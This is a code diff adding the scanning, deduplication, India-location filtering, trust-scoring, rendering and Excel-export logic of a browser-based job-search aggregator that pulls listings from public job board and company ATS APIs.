+                // EXECUTE EVERYTHING IN PARALLEL (Portals + Companies)
+                // We do not await company scans here - they run in background
+                this.scrapeGreenhouseCompanies();
+                this.scrapeLeverCompanies();
+
+                // Fetch from REAL job APIs (Requests-based, no API keys)
+                this.log("🚀 Scanning: Remotive, Jobicy, LinkedIn, Arbeitnow, WWR, Himalayas, Findwork...");
+
+                for (const kw of kws) {
+
+
+                    const locations = ['India', 'Bangalore', 'Hyderabad', 'Pune', 'Mumbai', 'Delhi', 'Noida', 'Gurgaon', 'Chennai', 'Coimbatore', 'Trichy', 'Trivandrum', 'Kochi', 'Madurai', 'Remote'];
+
+                    // Create promises that update UI immediately upon completion
+                    const promises = [
+                        this.remotive(kw),
+                        this.jobicy(kw),
+                        this.arbeitnow(kw),
+                        this.weworkremotely(kw),
+                        this.himalayas(kw),
+                        this.findwork(kw),
+                        ...locations.map(loc => this.linkedinGuest(kw, loc)),
+                        this.scrapeInternshala(kw),
+                        this.scrapeShine(kw),
+                        this.scrapeFoundit(kw),
+                        this.scrapeHirist(kw),
+                        this.scrapeWorkday(kw),
+                        this.scrapeIndeed(kw),
+                        this.scrapeGlassdoor(kw),
+                        this.scrapeHirepro(kw)
+                    ].map(p => p.then(jobs => {
+                        if (jobs && jobs.length > 0) {
+                            jobs.forEach(j => this.add(j));
+                            this.filter(); // Real-time update!
+                        }
+                        return jobs;
+                    }));
+
+                    await Promise.all(promises);
+                }
+
+                // IMMEDIATELY show portal results
+                this.filter();
+            },
+
+            async fetchProxy(url) {
+                try {
+                    const res = await fetch(`https://api.allorigins.win/get?url=${encodeURIComponent(url)}`);
+                    if (!res.ok) throw new Error("F");
+                    const d = await res.json();
+                    return d.contents;
+                } catch (e) { return null; }
+            },
+
+            // Scrape jobs from company based on their ATS type
+            async scrapeATS(company) {
+                const type = (company.t || '').toLowerCase();
+
+                try {
+                    // Handle Greenhouse companies
+                    if (type === 'greenhouse' || company.token) {
+                        const token = company.token || company.u.split('/').pop();
+                        const res = await fetch(`https://boards-api.greenhouse.io/v1/boards/${token}/jobs`);
+                        if (res.ok) {
+                            const d = await res.json();
+                            if (d.jobs && d.jobs.length > 0) {
+                                return d.jobs.slice(0, 15).map(j => ({
+                                    role: j.title,
+                                    link: j.absolute_url,
+                                    loc: j.location?.name || 'Remote',
+                                    date: j.updated_at,
+                                    src: 'Greenhouse'
+                                }));
+                            }
+                        }
+                    }
+
+                    // Handle Lever companies
+                    if (type === 'lever') {
+                        const token = company.token || company.n.toLowerCase().replace(/\s+/g, '');
+                        const res = await fetch(`https://api.lever.co/v0/postings/${token}`);
+                        if (res.ok) {
+                            const d = await res.json();
+                            if (Array.isArray(d) && d.length > 0) {
+                                return d.slice(0, 15).map(j => ({
+                                    role: j.text,
+                                    link: j.applyUrl || j.hostedUrl,
+                                    loc: j.categories?.location || 'Remote',
+                                    date: j.createdAt,
+                                    src: 'Lever'
+                                }));
+                            }
+                        }
+                    }
+
+                    // Custom type - cannot scrape directly, return empty
+                    // These will just show career site links if Show Directory is ON
+                } catch (e) {
+                    // Silent fail for individual companies
+                }
+                return [];
+            },
+
+            guessExp(title) {
+                const t = (title || '').toLowerCase();
+                // Most specific patterns first
+                if (t.includes('intern') || t.includes('trainee') || t.includes('fresher') || t.includes('graduate')) return '0-2';
+                if (t.includes('principal') || t.includes('staff') || t.includes('director') || t.includes('vp ') || t.includes('head of')) return '5+';
+                if (t.includes('senior') || t.includes('sr.') || t.includes('sr ') || t.includes('lead') || t.includes('manager') || t.includes('architect')) return '5+';
+                if (t.includes('iii') || t.includes(' 3') || t.includes('level 3') || t.includes('mid')) return '3-5';
+                if (t.includes('ii') || t.includes(' 2') || t.includes('level 2')) return '3-5';
+                if (t.includes('junior') || t.includes('jr.') || t.includes('jr ') || t.includes('associate') || t.includes('entry')) return '0-2';
+                return '0-2'; // Default for unspecified
+            },
+
+            // Check if location is in India
+            isIndiaLocation(loc) {
+                if (!loc) return false;
+                const l = loc.toLowerCase();
+                return this.INDIA_LOCATIONS.some(city => l.includes(city));
+            },
+            calcTrustScore(job) {
+                const company = (job.company || '').toLowerCase().replace(/[^a-z0-9]/g, '');
+                let score = 60; // Base score
+
+                // Verified company bonus
+                for (const vc of this.VERIFIED_COMPANIES) {
+                    if (company.includes(vc) || vc.includes(company)) {
+                        score += 30;
+                        break;
+                    }
+                }
+
+                // Source-based scoring
+                if (job.src === 'Greenhouse' || job.src === 'Lever') score += 10; // Direct ATS is trustworthy
+                if (job.src === 'Remotive' || job.src === 'Jobicy') score += 5;
+
+                // Spam pattern penalty
+                const spamScore = this.calcSpamScore(job);
+                score -= spamScore / 2;
+
+                // Valid URL bonus
+                if (job.link && (job.link.startsWith('https://') || job.link.startsWith('http://'))) score += 5;
+
+                return Math.min(100, Math.max(10, score));
+            },
+
+            // Parse job date properly
+            parseJobDate(dateStr) {
+                if (!dateStr) return null;
+                try {
+                    const d = new Date(dateStr);
+                    if (!isNaN(d.getTime())) return d.toISOString();
+                } catch (e) { }
+                return null;
+            },
+
+            // Generate hash for deduplication
+            jobHash(job) {
+                const str = `${(job.role || '').toLowerCase().trim()}|${(job.company || '').toLowerCase().trim()}|${(job.link || '').toLowerCase().trim()}`;
+                let hash = 0;
+                for (let i = 0; i < str.length; i++) {
+                    hash = ((hash << 5) - hash) + str.charCodeAt(i);
+                    hash = hash & hash;
+                }
+                return hash.toString(36);
+            },
+
+            // Check if location is in India
+            isIndiaLocation(loc) {
+                if (!loc) return false;
+                const locLower = loc.toLowerCase();
+                return this.INDIA_LOCATIONS.some(l => locLower.includes(l));
+            },
+
+            // RED FLAG DETECTION
+            redFlags(text) {
+                const flags = [];
+                const t = (text || '').toLowerCase();
+                if (t.includes('unpaid')) flags.push('Unpaid');
+                if (t.includes('commission only')) flags.push('Commission Only');
+                if (t.includes('training fee')) flags.push('Training Fee');
+                if (t.includes('bays') || t.includes('pay for')) flags.push('Paid Training');
+                return flags;
+            },
+
+            // Known ATS tokens mapping (from job_radar.py)
+            ATS_TOKENS: {
+                'stripe': 'stripe', 'netflix': 'netflix', 'airbnb': 'airbnb',
+                'postman': 'postmaninc', 'freshworks': 'freshworks', 'chargebee': 'chargebee',
+                'browserstack': 'browserstack', 'clevertap': 'clevertap', 'sprinklr': 'sprinklrinc',
+                'thoughtworks': 'thoughtworks', 'atlassian': 'atlassian', 'salesforce': 'salesforce',
+                'datadog': 'datadog', 'hackerrank': 'hackerrank', 'uber': 'uber', 'meta': 'meta',
+                'spotify': 'spotify', 'dropbox': 'dropbox', 'slack': 'slack', 'figma': 'figma',
+                'notion': 'notion', 'airtable': 'airtable', 'coinbase': 'coinbase', 'discord': 'discord',
+                'dream11': 'dreamsports', 'swiggy': 'swiggy', 'razorpay': 'razorpay', 'cred': 'cred',
+                'unacademy': 'unacademy', 'meesho': 'meesho', 'phonepe': 'phonepe', 'groww': 'groww'
+            },
+
+            getATSToken(company) {
+                const name = company.n.toLowerCase().replace(/[^a-z0-9]/g, '');
+                // Check known tokens first
+                for (const [key, token] of Object.entries(this.ATS_TOKENS)) {
+                    if (name.includes(key) || key.includes(name)) return token;
+                }
+                // Extract from URL if greenhouse/lever
+                if (company.u.includes('greenhouse.io')) {
+                    const m = company.u.match(/greenhouse\.io\/([^/?]+)/);
+                    if (m) return m[1];
+                }
+                if (company.u.includes('lever.co')) {
+                    const m = company.u.match(/lever\.co\/([^/?]+)/);
+                    if (m) return m[1];
+                }
+                return name;
+            },
+
+            async scrapeATS(company) {
+                const token = this.getATSToken(company);
+                let jobs = [];
+
+                try {
+                    // Try Greenhouse API first for all companies (many use it)
+                    if (company.t === 'Greenhouse' || company.u.includes('greenhouse')) {
+                        const res = await fetch(`https://boards-api.greenhouse.io/v1/boards/${token}/jobs`);
+                        if (res.ok) {
+                            const d = await res.json();
+                            jobs = (d.jobs || []).map(j => ({
+                                role: j.title, link: j.absolute_url, loc: j.location?.name || 'India',
+                                date: j.updated_at, type: 'Job', src: 'Greenhouse'
+                            }));
+                        }
+                    }
+                    // Try Lever API
+                    else if (company.t === 'Lever' || company.u.includes('lever.co')) {
+                        const res = await fetch(`https://api.lever.co/v0/postings/${token}`);
+                        if (res.ok) {
+                            const d = await res.json();
+                            if (Array.isArray(d)) {
+                                jobs = d.map(j => ({
+                                    role: j.text, link: j.applyUrl || j.hostedUrl,
+                                    loc: j.categories?.location || 'India',
+                                    date: null, type: 'Job', src: 'Lever'
+                                }));
+                            }
+                        }
+                    }
+                    // For Custom type - try both APIs as fallback
+                    else if (company.t === 'Custom') {
+                        // Try Greenhouse first
+                        try {
+                            const ghRes = await fetch(`https://boards-api.greenhouse.io/v1/boards/${token}/jobs`);
+                            if (ghRes.ok) {
+                                const d = await ghRes.json();
+                                if (d.jobs && d.jobs.length > 0) {
+                                    jobs = d.jobs.map(j => ({
+                                        role: j.title, link: j.absolute_url, loc: j.location?.name || 'India',
+                                        date: j.updated_at, type: 'Job', src: 'Greenhouse'
+                                    }));
+                                }
+                            }
+                        } catch (e) { }
+
+                        // Try Lever if Greenhouse failed
+                        if (jobs.length === 0) {
+                            try {
+                                const lvRes = await fetch(`https://api.lever.co/v0/postings/${token}`);
+                                if (lvRes.ok) {
+                                    const d = await lvRes.json();
+                                    if (Array.isArray(d) && d.length > 0) {
+                                        jobs = d.map(j => ({
+                                            role: j.text, link: j.applyUrl || j.hostedUrl,
+                                            loc: j.categories?.location || 'India',
+                                            date: null, type: 'Job', src: 'Lever'
+                                        }));
+                                    }
+                                }
+                            } catch (e) { }
+                        }
+                    }
+
+                    return jobs.length > 0 ? jobs : null;
+                } catch (e) {
+                    return null;
+                }
+            },
+
+            async scan() {
+                console.warn('🚀 JOB RADAR v23 - INDIA FILTER ACTIVE - If you see Spain/Berlin, browser is CACHED!');
+                if (this.state.scanning) return;
+                this.state.scanning = true;
+                this.state.jobs = [];
+                this.state.searchLinks = []; // Reset search links too
+                this.seenHashes = new Set(); // Reset deduplication on each scan
+                document.getElementById('job-list').innerHTML = '';
+                const btn = document.getElementById('btn-scan');
+                btn.disabled = true; btn.classList.add('opacity-50');
+                document.getElementById('status-indicator').className = 'w-2 h-2 rounded-full bg-yellow-500 animate-pulse';
+                document.getElementById('status-text').innerText = 'Starting scan...';
+
+                // 1. ALWAYS scrape real jobs from portal APIs first
+                this.log('📡 Fetching real jobs from portal APIs...');
+                await this.scrapePortals();
+
+                // 2. If "Search Mode" is ON, also add quick search links
+                if (document.getElementById('search-mode').checked) {
+                    this.log('🔗 Adding portal search links...');
+                    await this.generateLinks();
+                }
+
+                // 3. Process Companies from DB (Greenhouse/Lever APIs) - HIGHLY PARALLEL
+                this.log('🏢 Scanning company career pages with 50 parallel requests...');
+                const BATCH = 50; // HIGH-SPEED: Process 50 companies simultaneously
+                let idx = 0;
+                const showDir = document.getElementById('show-directory').checked;
+
+                const loop = async () => {
+                    while (idx < DB.length) {
+                        const slice = DB.slice(idx, idx + BATCH);
+                        idx += BATCH;
+
+                        document.getElementById('status-text').innerText = `Scanning ${idx}/${DB.length} companies...`;
+
+                        const promises = slice.map(async c => {
+                            let jobs = await this.scrapeATS(c);
+
+                            if (jobs && jobs.length > 0) {
+                                // Got real jobs - add them!
+                                jobs.forEach(j => {
+                                    this.add({
+                                        role: j.role, company: c.n, link: j.link, location: j.loc,
+                                        type: 'Job', exp: this.guessExp(j.role), date: j.date,
+                                        companyUrl: c.u, src: j.src
+                                    });
+                                });
+                                this.log(`✅ ${c.n}: ${jobs.length} jobs found`);
+                            } else if (showDir) {
+                                // No API jobs - add career site link only if Show Directory is ON
+                                this.add({
+                                    role: `Visit ${c.n} Careers`,
+                                    company: c.n,
+                                    link: c.u,
+                                    location: 'Career Site',
+                                    type: 'Site',
+                                    exp: 'N/A', match: 'site', src: 'Direct'
+                                });
+                            }
+                        });
+
+                        await Promise.all(promises);
+                        // Force render update after each batch to show progress visually
+                        this.filter();
+                        document.getElementById('progress').style.width = `${(idx / DB.length) * 100}%`;
+                        await new Promise(r => setTimeout(r, 50));
+                    }
+                    this.state.scanning = false;
+                    btn.disabled = false; btn.classList.remove('opacity-50');
+                    document.getElementById('status-indicator').className = 'w-2 h-2 rounded-full bg-green-500';
+                    document.getElementById('status-text').innerText = `Done! ${this.state.jobs.length} jobs`;
+
+                    // DEBUG: Show what's in each tab
+                    const allJobs = this.state.jobs.filter(j => j.type === 'Job').length;
+                    const portalLinks = this.state.searchLinks.length;
+                    const careerJobs = this.state.jobs.filter(j => ['Greenhouse', 'Lever', 'Direct'].includes(j.src) && j.type === 'Job').length;
+                    console.log(`📊 TAB BREAKDOWN:`);
+                    console.log(`   All Tab: ${allJobs} real jobs (from all APIs)`);
+                    console.log(`   Portals Tab: ${portalLinks} search links (LinkedIn, Naukri, Indeed, etc.)`);
+                    console.log(`   Careers Tab: ${careerJobs} jobs (from Greenhouse, Lever company APIs)`);
+                    this.log(`🎉 Scan complete! Found ${this.state.jobs.length} total jobs`);
+                };
+                loop();
+            },
+
+            add(j) {
+                // DEDUPLICATION: Skip if we've seen this job before
+                const hash = this.jobHash(j);
+                if (this.seenHashes.has(hash)) return;
+                this.seenHashes.add(hash);
+
+                // Skip "Visit X Careers" type entries if we already have jobs from that company
+                if (j.role && j.role.startsWith('Visit ') && j.role.endsWith(' Careers')) {
+                    const companyName = j.company.toLowerCase();
+                    const hasRealJobs = this.state.jobs.some(existing =>
+                        existing.company.toLowerCase() === companyName && existing.type === 'Job'
+                    );
+                    if (hasRealJobs) return; // Skip career site link if we have real jobs
+                }
+
+                const keywords = document.getElementById('keywords').value.toLowerCase().split(',').map(s => s.trim()).filter(s => s);
+                const strict = document.getElementById('strict-mode').checked;
+                const global = document.getElementById('global-mode').checked;
+
+                // DEBUG: Log every job that comes through
+                console.log(`[ADD] ${j.role} @ ${j.company} | Loc: "${j.location}" | Type: ${j.type} | Global: ${global}`);
+
+                // CRITICAL: INDIA LOCATION FILTER - Must be first check!
+                if (!global && j.type === 'Job') {
+                    const locLower = (j.location || '').toLowerCase().trim();
+
+                    // Pure remote check
+                    const isPureRemote = locLower === 'remote' ||
+                        locLower === 'remote, worldwide' ||
+                        locLower === 'worldwide' ||
+                        locLower === 'global' ||
+                        locLower === 'anywhere';
+
+                    // India check
+                    const isIndia = this.isIndiaLocation(j.location);
+
+                    console.log(`[LOCATION CHECK] isPureRemote: ${isPureRemote}, isIndia: ${isIndia}, location: "${j.location}"`);
+
+                    if (!isIndia && !isPureRemote) {
+                        console.log(`❌ [BLOCKED] Non-India: ${j.role} at ${j.company} - Location: ${j.location}`);
+                        return; // BLOCK THIS JOB!
+                    }
+                    console.log(`✅ [PASSED] India/Remote: ${j.role} - Location: ${j.location}`);
+                }
+
+                j.matchType = 'none';
+                if (j.match === 'site') {
+                    j.matchType = 'site';
+                } else {
+                    const text = (j.role + ' ' + j.company).toLowerCase();
+                    const exact = keywords.some(k => text.includes(k));
+                    const generic = GENERIC_ROLES.some(r => text.includes(r));
+
+                    // Strict mode check moved to filter() for dynamic toggling
+                    if (exact) j.matchType = 'exact';
+                    else if (generic) j.matchType = 'smart';
+                }
+
+                // REAL TRUST SCORE from company verification
+                j.trust = this.calcTrustScore(j);
+
+                // PROPER DATE PARSING
+                j.date = this.parseJobDate(j.date) || new Date().toISOString();
+
+                // Better experience extraction
+                if (!j.exp || j.exp === 'N/A') j.exp = this.guessExp(j.role);
+
+                this.state.jobs.push(j);
+                // Don't call filter() on every add - batch it (removed for performance)
+            },
+
+            filter() {
+                const exp = document.getElementById('filter-exp').value;
+                const searchInput = document.getElementById('search').value.toLowerCase();
+                const excludeInput = document.getElementById('exclude-search').value.toLowerCase();
+
+                // Extract negative terms from main search (start with -) AND explicit exclude box
+                const negativeTerms = [
+                    ...searchInput.split(' ').filter(t => t.startsWith('-') && t.length > 1).map(t => t.substring(1)),
+                    ...excludeInput.split(' ').filter(t => t.length > 0)
+                ];
+                // Remaining terms form the positive search phrase
+                const search = searchInput.split(' ').filter(t => !t.startsWith('-')).join(' ').trim();
+                const src = this.state.source; // 'all', 'portal', 'career'
+                const sortBy = document.getElementById('sort-by').value;
+                const locFilter = document.getElementById('filter-loc').value;
+                const dateFilter = document.getElementById('filter-date').value;
+                const globalMode = document.getElementById('global-mode').checked;
+
+                // REFINED TAB LOGIC:
+                // - "all" tab: EVERYTHING (Real Jobs + Search Links + Career Sites)
+                // - "portal" tab: Search Links + Scraped Jobs from Portals (LinkedIn, Remotive, etc.)
+                // - "career" tab: Jobs from COMPANY CAREER SITES (Greenhouse, Lever, Direct)
+
+                const CAREER_SOURCES = ['Greenhouse', 'Lever', 'Direct'];
+
+                let baseList = [];
+                if (src === 'all') {
+                    // ALL: Merge Real Jobs and Search Links
+                    baseList = [...this.state.jobs, ...this.state.searchLinks];
+                } else if (src === 'portal') {
+                    // PORTAL: Search Links + Real Jobs NOT from Career Sources
+                    // "Visit X Careers" (Type: Site) usually has src='Direct', so it goes to Career tab.
+                    // Real jobs from LinkedIn/Remotive have src='LinkedIn', etc.
+                    const portalJobs = this.state.jobs.filter(j => !CAREER_SOURCES.includes(j.src) && j.type === 'Job');
+                    baseList = [...this.state.searchLinks, ...portalJobs];
+                } else if (src === 'career') {
+                    // CAREER: Jobs from Greenhouse, Lever, or 'Direct' (Career Site links)
+                    baseList = this.state.jobs.filter(j => CAREER_SOURCES.includes(j.src));
+                }
+
+                console.log(`[FILTER] Tab: ${src} | Total Items: ${baseList.length}`);
+
+                let v = baseList.filter(j => {
+                    // STRICT INDIA LOCATION FILTER
+                    if (!globalMode && j.type === 'Job') {
+                        const locLower = (j.location || '').toLowerCase().trim();
+                        const isPureRemote = locLower === 'remote' ||
+                            locLower === 'remote, worldwide' ||
+                            locLower === 'worldwide' ||
+                            locLower === 'global' ||
+                            locLower === 'anywhere';
+                        const isIndia = this.isIndiaLocation(j.location);
+                        if (!isIndia && !isPureRemote) return false;
+                    }
+
+                    // Experience filter (skip for search links/site links)
+                    if (exp !== 'all' && j.type === 'Job') {
+                        if (exp === '0-2' && j.exp !== '0-2') return false;
+                        if (exp === '5+' && j.exp !== '5+') return false;
+                        if (exp === '3-5' && j.exp !== '3-5') return false;
+                    }
+
+                    // Location filter (Relaxed: Show Remote jobs too!)
+                    if (locFilter !== 'all') {
+                        const jobLoc = (j.location || '').toLowerCase();
+                        // Show if matches location OR matches 'Remote' OR matches 'India' (broad match) if user selected a city
+                        const isRemote = jobLoc.includes('remote') || jobLoc.includes('wfh') || jobLoc.includes('anywhere');
+                        if (!jobLoc.includes(locFilter.toLowerCase()) && !isRemote) return false;
+                    }
+
+                    // Date Posted filter
+                    if (dateFilter !== 'all' && j.date) {
+                        const jobDate = new Date(j.date);
+                        const now = new Date();
+                        const daysAgo = parseInt(dateFilter);
+                        const cutoff = new Date(now.getTime() - (daysAgo * 24 * 60 * 60 * 1000));
+                        if (jobDate < cutoff) return false;
+                    }
+
+                    // Search filter
+                    const jobStr = JSON.stringify(j).toLowerCase();
+
+                    // Negative Filter: Exclude if job contains ANY negative term
+                    if (negativeTerms.some(term => jobStr.includes(term))) return false;
+
+                    // Strict Title Match (Dynamic)
+                    if (document.getElementById('strict-mode').checked) {
+                        const keywords = document.getElementById('keywords').value.toLowerCase().split(',').map(s => s.trim()).filter(s => s);
+                        const text = (j.role + ' ' + j.company).toLowerCase();
+                        const exact = keywords.some(k => text.includes(k));
+                        const generic = GENERIC_ROLES.some(r => text.includes(r));
+                        if (!exact && !generic) return false;
+                    }
+
+                    // Positive Filter: Include only if job contains the search phrase
+                    if (search && !jobStr.includes(search)) return false;
+                    return true;
+                });
+
+                // SORT - Apply sort order
+                if (sortBy === 'date_desc') {
+                    v.sort((a, b) => new Date(b.date || 0) - new Date(a.date || 0));
+                } else if (sortBy === 'date_asc') {
+                    v.sort((a, b) => new Date(a.date || 0) - new Date(b.date || 0));
+                } else if (sortBy === 'role_asc') {
+                    v.sort((a, b) => (a.role || '').localeCompare(b.role || ''));
+                } else if (sortBy === 'company_asc') {
+                    v.sort((a, b) => (a.company || '').localeCompare(b.company || ''));
+                } else if (sortBy === 'trust_desc') {
+                    v.sort((a, b) => (b.trust || 0) - (a.trust || 0));
+                } else if (sortBy === 'exp_asc') {
+                    // Sort by lower bound of experience (e.g. "0-2" -> 0, "3-5" -> 3)
+                    const getExpVal = (e) => {
+                        if (!e) return 99;
+                        if (e === '0-2') return 0;
+                        if (e === '3-5') return 3;
+                        if (e === '5+') return 5;
+                        return 99;
+                    };
+                    v.sort((a, b) => getExpVal(a.exp) - getExpVal(b.exp));
+                } else if (sortBy === 'relevance') {
+                    // Sort by match type: exact > smart > site > none > link (bottom)
+                    v.sort((a, b) => {
+                        const order = { exact: 0, smart: 1, site: 2, none: 3, link: 99 };
+                        return (order[a.matchType] || 3) - (order[b.matchType] || 3);
+                    });
+                }
+
+                // Populate location dropdown with unique locations
+                this.populateLocations();
+
+                this.state.visible = v;
+                this.render();
+            },
+
+            // Populate locations dropdown dynamically
+            populateLocations() {
+                const locSelect = document.getElementById('filter-loc');
+                const currentVal = locSelect.value;
+                const locMap = new Map(); // Use Map to normalize case
+
+                this.state.jobs.forEach(j => {
+                    if (j.location && j.location !== 'Career Site' && j.location !== 'Direct Link' && j.location !== 'India') {
+                        // Normalize location names - take first part, normalize case
+                        let loc = j.location.split(',')[0].trim();
+                        // Skip generic/invalid locations
+                        if (!loc || loc.length < 3 || loc.length > 30) return;
+                        if (loc.toLowerCase() === 'remote' || loc.toLowerCase() === 'worldwide') {
+                            loc = 'Remote';
+                        }
+                        // Use lowercase key for dedup, store proper case name
+                        const key = loc.toLowerCase();
+                        if (!locMap.has(key)) {
+                            locMap.set(key, loc);
+                        }
+                    }
+                });
+
+                // Keep only first option, then add unique locations
+                const sortedLocs = Array.from(locMap.values()).sort();
+                locSelect.innerHTML = '<option value="all">📍 All Cities</option>';
+                locSelect.innerHTML += '<option value="Remote">🌍 Remote</option>';
+                sortedLocs.filter(l => l !== 'Remote').slice(0, 50).forEach(loc => {
+                    const opt = document.createElement('option');
+                    opt.value = loc;
+                    opt.textContent = loc;
+                    locSelect.appendChild(opt);
+                });
+                if (currentVal && [...locSelect.options].some(o => o.value === currentVal)) {
+                    locSelect.value = currentVal;
+                }
+            },
+
+            render() {
+                // Use requestAnimationFrame for smooth, no-blink rendering
+                requestAnimationFrame(() => {
+                    const c = document.getElementById('job-list');
+                    const list = this.state.visible.slice(0, this.state.limit);
+                    document.getElementById('stat-total').innerText = this.state.visible.length;
+
+                    // Build HTML in memory first, then update DOM once
+                    const fragment = document.createDocumentFragment();
+                    const tempDiv = document.createElement('div');
+
+                    tempDiv.innerHTML = list.map(j => {
+                        let badge = '';
+                        if (j.type === 'Portal') badge = `<span class="badge badge-portal bg-blue-500/20 text-blue-400 border border-blue-500/30">🌐 ${j.src}</span>`;
+                        else if (j.matchType === 'site') badge = `<span class="badge badge-site bg-emerald-500/20 text-emerald-400 border border-emerald-500/30">🏢 ${j.src || 'Career Site'}</span>`;
+                        else if (j.matchType === 'exact') badge = `<span class="badge badge-job">✅ EXACT</span>`;
+                        else badge = `<span class="badge badge-job">🧠 SMART</span>`;
+
+                        // NEW: Always show Source for real jobs if available
+                        let sourceBadge = '';
+                        if (j.src && j.type === 'Job' && j.matchType !== 'site') {
+                            sourceBadge = `<span class="badge bg-slate-800 text-slate-400 border border-slate-700 ml-1">🔗 ${j.src}</span>`;
+                        }
+
+                        const date = j.date ? new Date(j.date).toLocaleDateString(undefined, { month: 'short', day: 'numeric' }) : 'N/A';
+
+                        // Trust & Red Flags (Visual)
+                        const flags = this.redFlags(j.role + ' ' + (j.desc || ''));
+                        let flagBadge = '';
+                        if (flags.length > 0) flagBadge = `<span class="ml-2 badge bg-red-500/20 text-red-400 border border-red-500/30">🚩 ${flags.length} WARN</span>`;
+
+                        const trust = j.trust || (j.type === 'Portal' ? 95 : 80);
+                        let trustColor = trust > 90 ? 'text-green-400' : (trust > 70 ? 'text-yellow-400' : 'text-red-400');
+
+                        // Company Search Links
+                        const qCo = encodeURIComponent(j.company);
+                        const lnkNau = `https://www.naukri.com/jobs-at-${qCo.toLowerCase().replace(/ /g, '-')}`;
+                        const lnkNauSearch = `https://www.naukri.com/${qCo.toLowerCase().replace(/ /g, '-')}-jobs`;
+                        const lnkLin = `https://www.linkedin.com/jobs/search/?keywords=${qCo}`;
+                        const lnkInd = `https://in.indeed.com/jobs?q=${qCo}`;
+
+                        return `<div class="job-card bg-slate-900/60 p-4 rounded-lg mb-3 border border-slate-800 hover:border-indigo-500/50">
+                       <div class="flex justify-between items-start">
+                           <div class="flex-1 min-w-0">
+                               <div class="flex items-center gap-2 mb-1">
+                                    <h3 class="font-bold text-slate-200 text-sm truncate" title="${j.role}">${j.role}</h3>
+                                    ${flagBadge}
+                               </div>
+                               <div class="text-xs text-slate-400 flex flex-wrap gap-x-3 gap-y-1 items-center">
+                                   <div class="flex items-center gap-1.5">
+                                       <span class="text-indigo-300 font-medium">🏢 ${j.company}</span>
+                                       <a href="${lnkLin}" target="_blank" class="text-[9px] text-slate-500 hover:text-blue-400 transition" title="Search ${j.company} on LinkedIn"><i class="fa-brands fa-linkedin"></i></a>
+                                       <a href="${lnkNauSearch}" target="_blank" class="text-[9px] text-slate-500 hover:text-orange-400 transition" title="Search ${j.company} on Naukri"><i class="fa-solid fa-briefcase"></i></a>
+                                       <a href="${lnkInd}" target="_blank" class="text-[9px] text-slate-500 hover:text-blue-600 transition" title="Search ${j.company} on Indeed"><i class="fa-solid fa-search"></i></a>
+                                   </div>
+                                   <span class="flex items-center gap-1"><i class="fa-solid fa-location-dot text-[10px]"></i> ${j.location}</span>
+                                   ${j.type === 'Job' || j.exp ? `<span class="badge badge-exp text-[8px]">${j.exp} Yrs</span>` : ''}
+                                   <span class="text-[9px] ${trustColor} border border-white/10 px-1 rounded" title="Trust Score">🛡️ ${trust}%</span>
+                               </div>
+                               <div class="mt-2 text-[8px] flex items-center gap-2">
+                                  ${badge} 
+                                  ${sourceBadge}
+                                  <span class="text-slate-600">🕒 ${date}</span>
+                               </div>
+                               ${j.desc ? `<div class="mt-1 text-[9px] text-slate-500 italic truncate max-w-md">${j.desc}</div>` : ''}
+                           </div>
+                        <div class="flex flex-col gap-2 ml-2 shrink-0">
+                             <a href="${j.link}" target="_blank" class="px-4 py-1.5 bg-indigo-600 hover:bg-indigo-500 text-white text-[10px] font-bold rounded text-center shadow-lg shadow-indigo-900/20 min-w-[80px] whitespace-nowrap">
+                                ${j.type === 'Site' ? 'VISIT SITE' : 'APPLY 🚀'}
+                             </a>
+                             ${(j.companyUrl && j.type === 'Job') ? `
+                                <a href="${j.companyUrl}" target="_blank" class="px-4 py-1.5 bg-slate-800 hover:bg-slate-700 text-slate-400 hover:text-white text-[10px] font-bold rounded text-center border border-slate-700 min-w-[80px] whitespace-nowrap">
+                                    CAREERS
+                                </a>
+                             ` : ''}
+                        </div>
+                    </div>
+                </div>`;
+                    }).join('');
+
+                    // Update DOM efficiently - single paint
+                    c.innerHTML = tempDiv.innerHTML;
+
+                    if (this.state.visible.length > this.state.limit) document.getElementById('load-more-container').classList.remove('hidden');
+                    else document.getElementById('load-more-container').classList.add('hidden');
+                });
+            },
+
+            loadMore() { this.state.limit += 20; this.render(); },
+            resetFilters() {
+                document.getElementById('filter-exp').value = 'all';
+                document.getElementById('search').value = '';
+                document.getElementById('exclude-search').value = '';
+                this.setSource('all');
+                this.filter();
+            },
+            setSource(s) {
+                this.state.source = s;
+                ['all', 'portal', 'career'].forEach(x => {
+                    const b = document.getElementById('btn-src-' + x);
+                    if (x === s) b.className = "flex-1 py-1 bg-indigo-600 rounded text-[10px] text-white";
+                    else b.className = "flex-1 py-1 bg-slate-800 hover:bg-slate-700 rounded text-[10px] text-slate-400";
+                });
+                this.filter();
+            },
+            log(m) { const l = document.getElementById('logs'); l.innerHTML += `<div>${m}</div>`; l.scrollTop = l.scrollHeight; },
+
+            async export(t) {
+                const btn = document.querySelector('[onclick*="export"]');
+                if (btn) { btn.disabled = true; btn.textContent = 'Exporting...'; }
+
+                // Use requestIdleCallback or setTimeout to prevent UI freeze
+                await new Promise(r => setTimeout(r, 50));
+
+                try {
+                    const data = this.state.visible.map(j => ({
+                        Role: j.role,
+                        Company: j.company,
+                        Location: j.location,
+                        Experience: j.exp,
+                        Trust: j.trust + '%',
+                        Source: j.src,
+                        Link: j.link,
+                        Date: j.date ? new Date(j.date).toLocaleDateString() : 'N/A'
+                    }));
+
+                    const ws = XLSX.utils.json_to_sheet(data);
+                    const wb = XLSX.utils.book_new();
+                    XLSX.utils.book_append_sheet(wb, ws, 'Jobs');
+                    XLSX.writeFile(wb, `Jobs_${new Date().toISOString().slice(0, 10)}.xlsx`);
+                    this.log('📥 Exported ' + data.length + ' jobs to Excel');
+                } catch (e) {
+                    this.log('❌ Export failed: ' + e.message);
+                }
+
+                if (btn) { btn.disabled = false; btn.textContent = '📥 Export'; }
+            }
+        };
+
+        // Initialize Auth Check
+        window.onload = auth.init;
+    </script>
+</body>
+
+</html>
